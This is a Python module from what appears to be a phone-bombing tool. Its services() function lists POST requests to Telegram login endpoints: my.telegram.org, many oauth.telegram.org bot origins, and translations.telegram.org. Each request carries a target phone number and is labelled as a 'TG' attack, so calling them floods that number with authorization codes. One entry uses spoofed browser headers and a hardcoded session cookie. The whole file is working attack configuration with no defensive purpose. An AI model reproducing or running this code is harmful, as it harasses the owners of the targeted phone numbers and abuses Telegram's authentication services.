from car_hood.multiassist import useragent as user_agent

def services(number):
    return [
        {
            'info': {'country': 'ALL', 'attack': 'TG', 'website': 'My.Telegram.org', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://my.telegram.org/auth/send_password',
            'headers': user_agent()[0],
            'data': {'phone': number},
        },
        {
            'info': {'country': 'ALL', 'attack': 'TG', 'website': 'Oauth.Telegram.org', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://oauth.telegram.org/auth/request?bot_id=1199558236&origin=https%3A%2F%2Fbot-t.com&embed=1&return_to=https%3A%2F%2Fbot-t.com%2Flogin',
            'headers': user_agent()[0],
            'data': {'phone': number},
        },
        {
            'info': {'country': 'ALL', 'attack': 'TG', 'website': 'Oauth.Telegram.org', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://oauth.telegram.org/auth/request?bot_id=535136360&origin=https%3A%2F%2Ftestwidgetbot.herokuapp.com&embed=1&request_access=write&return_to=https%3A%2F%2Ftestwidgetbot.herokuapp.com%2F',
            'headers': user_agent()[0],
            'data': {'phone': number},
        },
        {
            'info': {'country': 'ALL', 'attack': 'TG', 'website': 'Oauth.Telegram.org', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://oauth.telegram.org/auth/request?bot_id=366357143&origin=https%3A%2F%2Fwww.botobot.ru&embed=1&request_access=write&lang=ru&return_to=https%3A%2F%2Fwww.botobot.ru%2Fblog%2Fru%2Fvoiti-cherez-telegram-avtorizatsiia-na-saitie-botobot%2F',
            'headers': user_agent()[0],
            'data': {'phone': number},
        },
        {
            'info': {'country': 'ALL', 'attack': 'TG', 'website': 'Oauth.Telegram.org', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://oauth.telegram.org/auth/request?bot_id=1803424014&origin=https%3A%2F%2Fru.telegram-store.com&embed=1&request_access=write&return_to=https%3A%2F%2Fru.telegram-store.com%2Fcatalog%2Fsearch',
            'headers': user_agent()[0],
            'data': {'phone': number},
        },
        {
            'info': {'country': 'ALL', 'attack': 'TG', 'website': 'Oauth.Telegram.org', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://oauth.telegram.org/auth/request?bot_id=319709511&origin=https%3A%2F%2Ftelegrambot.biz&embed=1&return_to=https%3A%2F%2Ftelegrambot.biz%2F',
            'headers': user_agent()[0],
            'data': {'phone': number},
        },
        {
            'info': {'country': 'ALL', 'attack': 'TG', 'website': 'Oauth.Telegram.org', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://oauth.telegram.org/auth/request?bot_id=1733143901&origin=https%3A%2F%2Ftbiz.pro&embed=1&request_access=write&return_to=https%3A%2F%2Ftbiz.pro%2Flogin',
            'headers': user_agent()[0],
            'data': {'phone': number},
        },
        {
            'info': {'country': 'ALL', 'attack': 'TG', 'website': 'Oauth.Telegram.org', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://oauth.telegram.org/auth/request?bot_id=883734075&origin=https%3A%2F%2Fconsole.bot4shop.com&embed=1&request_access=write&return_to=https%3A%2F%2Fconsole.bot4shop.com%2Flogin.html',
            'headers': user_agent()[0],
            'data': {'phone': number},
        },
        {
            'info': {'country': 'ALL', 'attack': 'TG', 'website': 'Oauth.Telegram.org', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://oauth.telegram.org/auth/request?bot_id=5305587912&origin=http%3A%2F%2Febot.one&embed=1&request_access=write&return_to=http%3A%2F%2Febot.one%2Fall%2Fs_radoid%2Fdialogs%2Fdialogs.php%3Flng%3Drus',
            'headers': user_agent()[0],
            'data': {'phone': number},
        },
        {
            'info': {'country': 'ALL', 'attack': 'TG', 'website': 'Oauth.Telegram.org', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://oauth.telegram.org/auth/request?bot_id=1434478353&origin=https%3A%2F%2Frobochat.io&embed=1&request_access=write&return_to=https%3A%2F%2Frobochat.io%2Fjoin%2F',
            'headers': user_agent()[0],
            'data': {'phone': number},
        },
        {
            'info': {'country': 'ALL', 'attack': 'TG', 'website': 'Oauth.Telegram.org', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://oauth.telegram.org/auth/request?bot_id=466141824&origin=https%3A%2F%2Fmipped.com&embed=1&request_access=write&return_to=https%3A%2F%2Fmipped.com%2Ff%2Fregister%2Fconnected-accounts%2Fsmodders_telegram%2F%3Fsetup%3D1',
            'headers': user_agent()[0],
            'data': {'phone': number},
        },
        {
            'info': {'country': 'ALL', 'attack': 'TG', 'website': 'Oauth.Telegram.org', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://oauth.telegram.org/auth/request?bot_id=1012878451&origin=https%3A%2F%2Funu.im&embed=1&request_access=write&return_to=https%3A%2F%2Funu.im%2Faccount%2Fregauth%2Ftelegram',
            'headers': user_agent()[0],
            'data': {'phone': number},
        },
        {
            'info': {'country': 'ALL', 'attack': 'TG', 'website': 'Oauth.Telegram.org', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://oauth.telegram.org/auth/request?bot_id=5463728243&origin=https%3A%2F%2Fwww.spot.uz&return_to=https%3A%2F%2Fwww.spot.uz%2Fru%2F2022%2F04%2F29%2Fyoto%2F%23',
            'headers': user_agent()[0],
            'data': {'phone': number},
        },
        {
            'info': {'country': 'ALL', 'attack': 'TG', 'website': 'Oauth.Telegram.org', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://oauth.telegram.org/auth/request?bot_id=210944655&origin=https%3A%2F%2Fcombot.org&embed=1&request_access=write&return_to=https%3A%2F%2Fcombot.org%2Flogin',
            'headers': user_agent()[0],
            'data': {'phone': number},
        },
        {
            'info': {'country': 'ALL', 'attack': 'TG', 'website': 'Oauth.Telegram.org', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://oauth.telegram.org/auth/request?bot_id=1852523856&origin=https%3A%2F%2Fcabinet.presscode.app&embed=1&return_to=https%3A%2F%2Fcabinet.presscode.app%2Flogin',
            'headers': user_agent()[0],
            'data': {'phone': number},
        },
        {
            'info': {'country': 'ALL', 'attack': 'TG', 'website': 'Oauth.Telegram.org', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://oauth.telegram.org/auth/request?bot_id=1093384146&origin=https%3A%2F%2Foff-bot.ru&embed=1&request_access=write&return_to=https%3A%2F%2Foff-bot.ru%2Fregister%2Fconnected-accounts%2Fsmodders_telegram%2F%3Fsetup%3D1',
            'headers': user_agent()[0],
            'data': {'phone': number},
        },
        {
            'info': {'country': 'ALL', 'attack': 'TG', 'website': 'Translations.Telegram.org', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://translations.telegram.org/auth/request',
            'headers': {'authority': 'translations.telegram.org', 'accept': 'application/json, text/javascript, */*; q=0.01', 'accept-language': 'ru,en;q=0.9,cy;q=0.8,uz;q=0.7', 'content-type': 'application/x-www-form-urlencoded; charset=UTF-8', 'cookie': 'stel_ssid=1300d252ca70bf2993_8438304871264084382; stel_lang=en; stel_dt=-300', 'origin': 'https://translations.telegram.org', 'referer': 'https://translations.telegram.org/', 'sec-ch-ua': '"Not?A_Brand";v="8", "Chromium";v="108", "Yandex";v="23"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"', 'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'same-origin', 'user-agent': user_agent()[1], 'x-requested-with': 'XMLHttpRequest',},
            'data': {'phone': number,},
        }
]
